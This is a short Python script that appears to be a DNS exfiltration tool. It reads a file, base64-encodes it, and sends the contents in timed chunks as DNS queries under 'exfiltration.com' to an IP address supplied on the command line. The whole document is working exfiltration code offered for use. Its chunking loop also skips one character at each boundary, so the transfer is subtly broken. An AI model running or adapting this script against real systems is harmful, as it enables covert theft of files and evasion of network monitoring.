from  dnslib import *
import socket
import base64
import sys
import time

if len(sys.argv) != 5:
    print("rong input ")
    exit()
lon = int(sys.argv[1])
tim = float(sys.argv[2])
fil =sys.argv[3]
ip=sys.argv[4]
f = open(fil)
a=f.read()

q=base64.b64encode(a.encode('ascii'))
g=q.decode("ascii")


print(g)
i=0
while True :
 time.sleep(tim)
 if i <= len(g)-lon-1:
  d = DNSRecord.question(g[i:i+lon]+".exfiltration.com")
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.sendto(d.pack(), (ip, 53))
  s.close()
 else :
  d = DNSRecord.question(g[i:len(g)]+".exfiltration.com")
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.sendto(d.pack(), (ip, 53))
  s.close()
  break
 i=i+lon+1
print("\n\ncomplete")
 

